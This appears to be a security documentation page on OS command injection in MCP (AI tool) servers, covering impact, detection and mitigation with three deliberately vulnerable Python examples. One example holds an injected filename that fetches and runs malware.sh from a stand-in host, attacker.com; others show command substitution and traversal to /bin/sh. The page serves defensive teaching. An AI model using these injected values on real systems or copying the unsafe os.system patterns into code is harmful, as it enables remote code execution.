---
layout: default
title: "OS Command Injection"
permalink: /ttps/command-injection/os-command-injection/
nav_order: 3
parent: "Command & Code Injection"
grand_parent: "MCP Security TTPs"
---

# OS Command Injection

**Category**: Command & Code Injection  
**Severity**: Critical  
**MITRE ATT&CK Mapping**: T1059 (Command and Scripting Interpreter)

## Description

Execution of operating system commands through vulnerable MCP server implementations, enabling attackers to execute arbitrary OS-level commands and compromise the underlying system.

## Technical Details

### Attack Vector
- OS command execution through MCP tools
- System call vulnerabilities
- Shell command injection
- Process execution manipulation

### Common Techniques
- Shell metacharacter exploitation
- Command substitution attacks
- Process chaining
- Environment variable manipulation

## Impact

- **System Takeover**: Complete control over the operating system
- **File System Access**: Read, write, and execute files on the system
- **Network Access**: Access to network resources and services
- **Privilege Escalation**: Execution with elevated system privileges

## Detection Methods

### System Monitoring
- Monitor system call execution
- Track process creation
- Detect unusual command patterns
- Monitor file system access

### Process Analysis
- Analyze process execution trees
- Monitor process arguments
- Track process lifetime
- Detect process injection

## Mitigation Strategies

### Command Filtering
- Implement command allow-lists
- Use command validation
- Deploy command sanitization
- Restrict system access

### Process Security
- Use process isolation
- Implement sandboxing
- Deploy process monitoring
- Restrict process permissions

## Real-World Examples

### Example 1: Shell Metacharacter Exploitation
```python
def compress_file(filename):
    # Vulnerable OS command execution
    os.system(f"gzip {filename}")
    
    # Attack: filename = "file.txt; wget http://attacker.com/malware.sh; chmod +x malware.sh; ./malware.sh"
    # Executed: gzip file.txt; wget http://attacker.com/malware.sh; chmod +x malware.sh; ./malware.sh
```

### Example 2: Command Substitution
```python
def get_file_info(filename):
    # Vulnerable command substitution
    result = subprocess.check_output(f"file {filename}", shell=True)
    
    # Attack: filename = "$(whoami > /tmp/user.txt)"
    # Executed: file $(whoami > /tmp/user.txt)
```

### Example 3: Environment Variable Manipulation
```python
def run_script(script_name):
    # Vulnerable environment variable usage
    os.system(f"$SCRIPT_DIR/{script_name}")
    
    # Attack: script_name = "../../../bin/sh" with SCRIPT_DIR="/tmp"
    # Executed: /tmp/../../../bin/sh
```

## References & Sources

- **Strobes Security** - "MCP and Its Critical Vulnerabilities"
- **Simon Willison** - "Model Context Protocol has prompt injection security problems"
- **Structured MCP Threats** - Comprehensive threat landscape analysis

## Related TTPs

- [Command Injection](command-injection.md)
- [Shell Command Execution](shell-command-execution.md)
- [Code Injection](code-injection.md)

---

*OS command injection represents a critical vulnerability that can lead to complete system compromise through arbitrary operating system command execution.*